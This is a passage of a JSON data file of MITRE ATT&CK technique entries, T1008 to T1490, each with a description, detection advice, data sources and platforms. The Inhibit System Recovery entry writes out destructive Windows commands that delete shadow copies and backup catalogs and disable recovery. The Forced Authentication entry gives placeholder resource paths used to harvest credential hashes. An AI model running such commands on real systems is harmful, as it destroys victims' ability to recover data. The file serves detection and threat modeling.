                "id": "T1008",
                "name": "Fallback Channels",
                "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
                "url": "https://attack.mitre.org/techniques/T1008",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1083",
                "name": "File and Directory Discovery",
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).",
                "url": "https://attack.mitre.org/techniques/T1083",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1222",
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory�s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "url": "https://attack.mitre.org/techniques/T1222",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Active Directory: Active Directory Object Modification",
                    "File: File Metadata"
                ],
                "detection": "Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM",
                    "root"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1495",
                "name": "Firmware Corruption",
                "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.",
                "url": "https://attack.mitre.org/techniques/T1495",
                "data_sources": [
                    "Firmware: Firmware Modification"
                ],
                "detection": "System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior.",
                "permissions": [
                    "Administrator",
                    "root",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1187",
                "name": "Forced Authentication",
                "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
                "url": "https://attack.mitre.org/techniques/T1187",
                "data_sources": [
                    "File: File Access",
                    "File: File Creation",
                    "File: File Modification",
                    "Network Traffic: Network Traffic Content",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.\n\nMonitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1606",
                "name": "Forge Web Credentials",
                "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)",
                "url": "https://attack.mitre.org/techniques/T1606",
                "data_sources": [
                    "Logon Session: Logon Session Creation",
                    "Web Credential: Web Credential Creation",
                    "Web Credential: Web Credential Usage"
                ],
                "detection": "Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.",
                "platforms": [
                    "SaaS",
                    "Windows",
                    "macOS",
                    "Linux",
                    "Azure AD",
                    "Office 365",
                    "Google Workspace"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1592",
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "url": "https://attack.mitre.org/techniques/T1592",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1589",
                "name": "Gather Victim Identity Information",
                "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "url": "https://attack.mitre.org/techniques/T1589",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1590",
                "name": "Gather Victim Network Information",
                "description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "url": "https://attack.mitre.org/techniques/T1590",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1591",
                "name": "Gather Victim Org Information",
                "description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: DOB Business Lookup) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "url": "https://attack.mitre.org/techniques/T1591",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1061",
                "name": "Graphical User Interface",
                "description": "**This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.**\n\nThe Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.",
                "url": "https://attack.mitre.org/techniques/T1061",
                "detection": "Detection of execution through the GUI will likely lead to significant false positives. Other factors should be considered to detect misuse of services that can lead to adversaries gaining access to systems through interactive remote sessions. \n\nUnknown or unusual process launches outside of normal behavior on a particular system occurring through remote interactive sessions are suspicious. Collect and audit security logs that may indicate access to and use of Legitimate Credentials to access remote systems within the network.",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1200",
                "name": "Hardware Additions",
                "description": "Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.",
                "url": "https://attack.mitre.org/techniques/T1200",
                "detection": "Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. \n\nEndpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "initial-access"
                ]
            },
            {
                "id": "T1564",
                "name": "Hide Artifacts",
                "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
                "url": "https://attack.mitre.org/techniques/T1564",
                "data_sources": [
                    "File: File Creation",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Metadata",
                    "User Account: User Account Creation",
                    "User Account: User Account Metadata",
                    "File: File Modification",
                    "Script: Script Execution",
                    "Process: OS API Execution",
                    "Windows Registry: Windows Registry Key Modification",
                    "Firmware: Firmware Modification",
                    "Process: Process Creation",
                    "File: File Creation",
                    "Service: Service Creation",
                    "File: File Content"
                ],
                "detection": "Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1574",
                "name": "Hijack Execution Flow",
                "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
                "url": "https://attack.mitre.org/techniques/T1574",
                "data_sources": [
                    "Windows Registry: Windows Registry Key Modification",
                    "Process: Process Creation",
                    "Module: Module Load",
                    "Command: Command Execution",
                    "Service: Service Metadata",
                    "File: File Creation",
                    "File: File Modification"
                ],
                "detection": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "persistence",
                    "privilege-escalation",
                    "defense-evasion"
                ]
            },
            {
                "id": "T1062",
                "name": "Hypervisor",
                "description": "**This technique has been deprecated and should no longer be used.**\n\nA type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.",
                "url": "https://attack.mitre.org/techniques/T1062",
                "detection": "Type-1 hypervisors may be detected by performing timing analysis. Hypervisors emulate certain CPU instructions that would normally be executed by the hardware. If an instruction takes orders of magnitude longer to execute than normal on a system that should not contain a hypervisor, one may be present. (Citation: virtualization.info 2006)",
                "permissions": [
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1562",
                "name": "Impair Defenses",
                "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",
                "url": "https://attack.mitre.org/techniques/T1562",
                "data_sources": [
                    "Process: Process Termination",
                    "Windows Registry: Windows Registry Key Modification",
                    "Windows Registry: Windows Registry Key Deletion",
                    "Command: Command Execution",
                    "Service: Service Metadata",
                    "Sensor Health: Host Status",
                    "Script: Script Execution",
                    "Firewall: Firewall Disable",
                    "Firewall: Firewall Rule Modification",
                    "Cloud Service: Cloud Service Modification",
                    "Cloud Service: Cloud Service Disable"
                ],
                "detection": "Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.\n\nMonitor environment variables and APIs that can be leveraged to disable security measures.",
                "permissions": [
                    "Administrator",
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Office 365",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1525",
                "name": "Implant Internal Image",
                "description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim�s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
                "url": "https://attack.mitre.org/techniques/T1525",
                "data_sources": [
                    "Image: Image Creation",
                    "Image: Image Modification"
                ],
                "detection": "Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.\n\nIn containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration. ",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "IaaS",
                    "Containers"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1070",
                "name": "Indicator Removal on Host",
                "description": "Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1552/003) and /var/log/*.\n\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "url": "https://attack.mitre.org/techniques/T1070",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Deletion",
                    "File: File Modification",
                    "Windows Registry: Windows Registry Key Modification",
                    "Windows Registry: Windows Registry Key Deletion",
                    "Process: OS API Execution",
                    "Command: Command Execution",
                    "Network Traffic: Network Traffic Content",
                    "User Account: User Account Authentication",
                    "File: File Metadata"
                ],
                "detection": "File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1202",
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "url": "https://attack.mitre.org/techniques/T1202",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1105",
                "name": "Ingress Tool Transfer",
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "url": "https://attack.mitre.org/techniques/T1105",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content",
                    "File: File Creation"
                ],
                "detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1490",
                "name": "Inhibit System Recovery",
                "description": "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>",
                "url": "https://attack.mitre.org/techniques/T1490",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Service: Service Metadata",
                    "Windows Registry: Windows Registry Key Modification",
                    "File: File Deletion"
                ],
                "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>).",
                "permissions": [
                    "Administrator",
                    "root",
                    "SYSTEM",
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1056",
                "name": "Input Capture",
